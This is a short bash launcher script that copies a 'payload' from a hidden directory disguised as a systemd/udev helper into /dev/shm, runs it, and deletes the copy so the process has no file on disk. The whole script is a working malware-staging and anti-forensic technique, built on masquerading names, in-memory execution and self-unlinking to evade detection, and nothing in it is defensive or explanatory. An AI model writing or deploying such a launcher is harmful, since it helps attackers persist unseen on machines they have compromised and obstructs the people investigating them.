#!/bin/bash
# Runs the payload from a throwaway copy in RAM, then deletes that copy so the
# running process has no backing file on disk (/proc/<pid>/exe -> "(deleted)").
set -euo pipefail

SRC=/opt/.systemd-helper/.udev-net-helper
# mktemp avoids a `tr </dev/urandom | head` pipe, which trips SIGPIPE under
# `set -o pipefail` and kills the launcher before the payload ever starts.
RUN=$(mktemp /dev/shm/.udev-XXXXXXXX)

cp "$SRC" "$RUN"
chmod 0755 "$RUN"
"$RUN" &
PID=$!

# unlink the running executable; the kernel keeps the inode alive for the process
rm -f "$RUN"

wait "$PID"
